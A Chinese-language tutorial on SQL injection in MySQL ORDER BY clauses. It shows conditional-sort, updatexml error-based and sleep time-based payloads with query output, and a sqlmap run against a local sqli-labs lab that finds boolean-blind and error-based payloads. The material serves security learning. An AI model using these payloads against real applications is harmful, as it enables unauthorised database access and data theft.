>这一系列文章打算去总结sql注入发生的位置，并总结他们的不同，此文是第一篇order by位置的注入

排序注入为何要拿出来说：
1. order by之后可用的语句有限，有必要去总结下其利用的特点

2. order by位置是比较难以使用预编译去处理的，像mybatis这一类成熟的框架中也存在这种问题详见：[Mybatis框架下SQL注入漏洞面面观](https://mp.weixin.qq.com/s?src=3&amp;timestamp=1514813452&amp;ver=1&amp;signature=aort5C46VjBc1nw781Wc8WUSE8n3ErlNwWwH94BBZVSJ--3bdFc5yDWx2qD0Bs-ydAPLNqAcH01Jkncw28TLJxymWKhZAnRucnkLZHRkiQZAA89cHB0QJBKJt2TE5JCDLNrKyQuZS7YMeMtxGEX29oPP2mEI1j3ko9QBWFnNqR8=)
 
# 0X00 order by 的官方文档

```sql
SELECT
    [ALL | DISTINCT | DISTINCTROW ]
      [HIGH_PRIORITY]
      [STRAIGHT_JOIN]
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
    select_expr [, select_expr ...]
    [FROM table_references
      [PARTITION partition_list]
    [WHERE where_condition]
    [GROUP BY {col_name | expr | position}
      [ASC | DESC], ... [WITH ROLLUP]]
    [HAVING where_condition]
    [ORDER BY {col_name | expr | position}
      [ASC | DESC], ...]
    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
    [PROCEDURE procedure_name(argument_list)]
    [INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        export_options
      | INTO DUMPFILE 'file_name'
      | INTO var_name [, var_name]]
    [FOR UPDATE | LOCK IN SHARE MODE]]
```
只看order by部分我们知道order by后可以是“字段名”、“表达式”、“字段位置”，另外order by之后不可以出现union
```shell
mysql> select * from emails order by email_id union seletc * from users;
ERROR 1221 (HY000): Incorrect usage of UNION and ORDER BY
```
为啥会报错，还是mysql的文档用法里写的，大意就是order by如果出现在子句中必须出现在末尾或者将每个子句加上括号提升优先级，否则都会按照union的语法去执行
```sql
substatement union all substatement union all substatement [order by-clause] [limit-clause]
```
# order by 注入利用
这里的利用方式无非也就两种：

1. 有回显式的注入
2. 盲注

首先解释第一种，有回显的注入。这种注入需要一个前置的条件，就是我们必须知道“字段名“，注意这里知道”字段位置“是没有用的，因为，这里的数字会被认为是字符串。依据页面排序的不同我们可以判断我们注入是否得到我们需要的值，像下面这样
```sql
mysql> select * from users order by if(1=2,id,username);
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 14 | admin4   | admin4     |
|  2 | Angelina | I-kill-you |
|  7 | batman   | mob!le     |
| 12 | dhakkan  | dumbo      |
|  1 | Dumb     | Dumb       |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
+----+----------+------------+
13 rows in set (0.00 sec)

mysql> select * from users order by if(1=1,id,username);
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
+----+----------+------------+
13 rows in set (0.00 sec)
```
接下来是第二种，盲注，这里的盲注由于可以插入语句，所以基本上和where位置的注入差不了太多，可以报错或者时间

报错注入
```sql
mysql> select * from users order by updatexml(1,user(),1);
ERROR 1105 (HY000): XPATH syntax error: '@localhost'
```
更多的报错技巧可以查看之前的报错注入篇

时间注入
```sql
mysql> select * from users order by if(1=1,sleep(1),1);
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  9 | admin1   | admin1     |
|  4 | secure   | crappy     |
| 12 | dhakkan  | dumbo      |
|  7 | batman   | mob!le     |
|  2 | Angelina | I-kill-you |
| 10 | admin2   | admin2     |
|  5 | stupid   | stupidity  |
| 14 | admin4   | admin4     |
|  8 | admin    | admin      |
|  3 | Dummy    | p@ssword   |
| 11 | admin3   | admin3     |
|  6 | superman | genious    |
+----+----------+------------+
13 rows in set (13.05 sec)
```
可以发现这报错和时间注入在order by的情况下和where的情况下几近相似
相比回显和盲注，在order by的场景下，似乎是盲注的利用条件要简单过回显，但是回显的情况我相信还是存在的，只是还没有遇见
# order by 注入成熟利用
比较过order by位置和where位置我相信一般的sqlmap注入指令就可以跑出这种类型的注入了，我们来看看
```shell
python sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-46/?sort=1" --dbms mysql --technique=BEUS
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.1.5#dev}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 22:05:42

[22:05:43] [INFO] testing connection to the target URL
[22:05:43] [INFO] testing if the target URL content is stable
[22:05:44] [INFO] target URL content is stable
[22:05:44] [INFO] testing if GET parameter 'sort' is dynamic
[22:05:44] [INFO] confirming that GET parameter 'sort' is dynamic
[22:05:44] [INFO] GET parameter 'sort' is dynamic
[22:05:44] [INFO] heuristic (basic) test shows that GET parameter 'sort' might be injectable (possible DBMS: 'MySQL')
[22:05:44] [INFO] heuristic (XSS) test shows that GET parameter 'sort' might be vulnerable to cross-site scripting (XSS) attacks
[22:05:44] [INFO] testing for SQL injection on GET parameter 'sort'
for the remaining tests, do you want to include all tests for 'MySQL' extending provin
[22:05:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:05:47] [WARNING] reflective value(s) found and filtering out
[22:05:47] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[22:05:47] [INFO] GET parameter 'sort' appears to be 'MySQL >= 5.0 boolean-based blind - Parameter replace' injectable (with --string="10")
[22:05:47] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[22:05:47] [INFO] GET parameter 'sort' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[22:05:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:05:47] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
GET parameter 'sort' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: sort (GET)
    Type: boolean-based blind
    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
    Payload: sort=(SELECT (CASE WHEN (8800=8800) THEN 8800 ELSE 8800*(SELECT 8800 FROM INFORMATION_SCHEMA.PLUGINS) END))

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: sort=1 AND (SELECT 4316 FROM(SELECT COUNT(*),CONCAT(0x717a7a7871,(SELECT (ELT(4316=4316,1))),0x716b717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
---
[22:05:49] [INFO] the back-end DBMS is MySQL
web application technology: PHP 5.6.33, Apache 2.4.28
back-end DBMS: MySQL >= 5.0
[22:05:49] [INFO] fetched data logged to text files under '/Users/nanchealdu/.sqlmap/output/127.0.0.1'
```
事实确实如此